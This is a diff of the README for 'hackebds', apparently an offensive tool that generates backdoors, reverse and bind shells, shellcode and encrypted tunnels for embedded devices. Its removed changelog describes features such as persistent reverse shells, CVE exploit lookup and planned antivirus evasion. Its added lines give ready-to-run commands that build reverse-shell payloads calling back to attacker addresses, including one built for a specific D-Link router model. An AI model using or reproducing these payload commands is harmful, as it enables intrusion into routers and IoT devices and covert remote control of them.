- 2022.11.1 Removed the generation sleep time of shellcode, and added mips_ bind_ Shell, reverse of x86 and x64 small end_ shell_ Backdoor, the mips that are expected to be interrupted by mips_ bind_ Shell, which solves the error of password logic processing in the bindshell in mips
+```bash
+curl --socks5-hostname 127.0.0.1:1081 http://example.com/
+```
 
- 2022.11.2 Joined aarch64_ bind_ shell
- 2022.11.2 Support command line generation backdoor and shell code, characterized by light, small, efficient and fast
+### 6. Reverse Shellcode
 
- 2022.12.6 0.2.8 Add sparc_bind_shell && powerpc_bind_shell ，fix some bug
+```bash
+hackebds -arch armelv7 -res reverse_shellcode \
+  -reverse_ip 192.168.56.1 -reverse_port 4444
+```
 
- 2022.12.26 0.2.9 Added the program function of generating specified commands, and added executable permissions after generating files
+### 7. Use `-model`
 
- 2023.1.6 0.3.0 repaired cmd_ The file generates the function bug of executing the specified command program, and adds the model ->arch list, Android bind_ Shell file
+```bash
+hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 \
+  -model DIR-816 -res reverse_shell_file
+```
 
- 2023.1.16 0.3.1 Added bash reverse_ Shell. At present, this tool only supports sh and bash. The - l function is added to list the relationship between device model and architecture, and the - power function is added to generate a more powerful reverse_ shell_ File, which realizes the continuous creation of reverse shell links without killing the program. Currently, the - power function only supports reverse_ shell_ file
+### 8. Use `--mcpu`
 
- 2023.1.29 0.3.3 -The power function adds support for bind_shell, bind_shell is more stable, and fixes some bugs in the execution of bind_shell and cmd_file files of the aarch64 architecture
+```bash
+hackebds -mcpu mips32r2 -li -arch mipsel \
+  -reverse_ip 127.0.0.1 -reverse_port 9999 \
+  -res reverse_shell_file
+```
 
-2023.3.7 0.3.6 Added support for the mipsn32 architecture (this architecture may be encountered in devices such as zyxel firewalls)
+### 9. Use `--firmware`
 
-2023.5.30 add the retrieval of CVE and output the content of EXP and POC files in the device information
+```bash
+hackebds --firmware ./firmware.bin
+```
 
-2023.11.11 Fixed the issue of armv5 series backdoors not being able to generate shells in Vitogate_300  The rear doors  are operating normally，Simplified reverse_ Command parameters such as IP can be used with - lhost and - lport, Added some device vulnerabilities
+## Notes
 
-2026.4.7 0.4.1 Added ChaCha20 end-to-end encrypted reverse/bind shells across 6 architectures (passphrase → SHA-256 → 256-bit key, bidirectional nonces, ~3–7KB binaries); added pure-assembly SOCKS5 proxy ELF binaries (~2–5KB) supporting reverse/forward tunneling and RFC 1929 auth; added full PTY interactive terminal mode; added multi-session shell manager with tab completion and history; added a unified server mode combining SOCKS5 proxy and multi-session shell management in a single console
-
-## Problems to be solved
-
-Support the backend of the loongarch64 architecture and the generation of the bind_shell program (binutils has been integrated into the mainline, but cannot be installed directly through apt)
-
-Improve the generation of power_bind_shell backdoors of powerpc and sparc series
-
-Add anti-kill function for backdoor programs
-
-
-
-## vul fix
-
-
-CVE-2021-29921 The tool is a complete client program. This vulnerability will not affect the use of the tool. If you want to fix it, please run the tool in python 3.9 and above
-
-CVE-2022-40023 DOS_attack pip install -U  mako (The vulnerability does not apply to this tool)
-
-CVE-2021-20270 DOS_attack pip install -U  pygments (The vulnerability does not apply to this tool)
-
- 0.2.5 Version Repair directory traversal in the specified model
+- `-bind_ip` is for listener-side ELF files only
+- `reverse_shell_file` and `reverse_proxy_file` are dial-out payloads and do not bind a local listener IP
+- `reverse_proxy_server` and `forward_proxy_file` support `-bind_ip`
+- encrypted shell/proxy examples work with both `chacha20` and `aes`, as long as both sides match
